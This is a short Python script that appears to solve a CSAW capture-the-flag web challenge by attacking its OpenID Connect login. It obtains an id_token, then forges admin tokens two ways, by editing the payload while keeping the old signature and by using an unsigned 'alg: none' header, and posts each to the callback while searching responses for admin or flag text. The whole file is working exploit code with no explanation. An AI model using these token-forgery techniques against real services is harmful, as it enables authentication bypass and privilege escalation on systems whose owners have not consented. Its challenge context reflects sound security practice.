import requests, re, base64, json, sys
B="http://trustdinoidc.chal.csaw.io:8990"
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def unb64(s): return base64.urlsafe_b64decode(s+"="*(-len(s)%4))
def get_token(idp="paleoid", scope="openid profile freeosaurus:redeem", state="x"):
    s=requests.Session()
    r=s.get(f"{B}/idp/{idp}/authorize?client_id=trustdinoidc-portal&redirect_uri=http%3A%2F%2Ftrustdinoidc.chal.csaw.io%3A8990%2Foauth%2Fcallback&scope={requests.utils.quote(scope,safe='')}&state={state}")
    d=dict(re.findall(r'name="([^"]+)" value="([^"]*)"', r.text))
    return d
def post(tok, state="x"):
    s=requests.Session()
    r=s.post(B+"/oauth/callback", data={"id_token":tok,"state":state})
    return r
def show(r):
    print(r.status_code, r.text[:200].replace("\n"," ") if r.status_code!=200 else "")
    if r.status_code==200:
        m=re.search(r'<span class="tier[^>]*>([^<]*)</span>', r.text)
        m2=re.search(r'<span class="nav-link">([^<]*)</span>', r.text)
        print("TIER:",m and m.group(1),"IDENT:",m2 and m2.group(1))
        for line in r.text.splitlines():
            if "print" in line or "admin" in line.lower() or "csaw" in line.lower(): print("   ",line.strip()[:200])
    return r
if __name__=="__main__":
    d=get_token()
    tok=d["id_token"]
    h,p,sg=tok.split(".")
    print("orig header",json.loads(unb64(h)))
    print("orig payload",json.loads(unb64(p)))
    print("--- tamper payload only")
    pl=json.loads(unb64(p)); pl["sub"]="admin"; pl["role"]="admin"; pl["scope"]="openid profile admin"
    t2=h+"."+b64(json.dumps(pl).encode())+"."+sg
    show(post(t2))
    print("--- alg none")
    hd={"alg":"none","typ":"JWT"}
    t3=b64(json.dumps(hd).encode())+"."+b64(json.dumps(pl).encode())+"."
    show(post(t3))
EOF
